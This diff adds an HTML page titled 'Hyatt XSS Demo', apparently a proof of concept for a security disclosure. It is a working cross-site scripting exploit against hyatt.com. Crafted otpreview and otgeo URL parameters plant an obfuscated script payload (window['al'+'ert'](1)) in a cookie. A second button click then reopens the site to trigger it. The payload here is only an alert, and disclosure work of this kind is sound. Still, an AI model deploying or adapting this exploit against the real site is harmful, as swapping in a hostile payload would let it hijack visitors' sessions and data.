@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Hyatt XSS Demo</title>
+	</head>
+	<body>
+		<button id="openhyatt">Continue to Hyatt.com</button>
+		<script type="text/javascript">
+			let theWindow;
+
+			let openCount = 0;
+
+			function theOpener() {
+				if ( openCount >= 1 ) {
+					openHyattWithSrc();
+				} else {
+					openHyatt();
+				}
+
+				openCount++;
+			}
+
+			async function openHyatt() {
+				theWindow = window.open( 'https://hyatt.com/?otpreview=true&otgeo=%26expiry=%26%20s_cmch%3Dwindow%5B%22al%22%252B%22ert%22%5D%281%29' );
+
+				await new Promise(r => setTimeout(r, 5000));
+			
+				theWindow.postMessage( 'CLEAR_OT_COOKIES', '*' );
+
+				theWindow.close();
+			}
+
+			function openHyattWithSrc() {
+				const src = Math.round( Math.random( 1, 100000 ) * 100 );
+				theWindow = window.open( `https://hyatt.com?src=${ src }` );
+			}
+
+			document.getElementById( 'openhyatt' ).addEventListener( 'click', theOpener );
+		</script>
+	</body>
+</html>
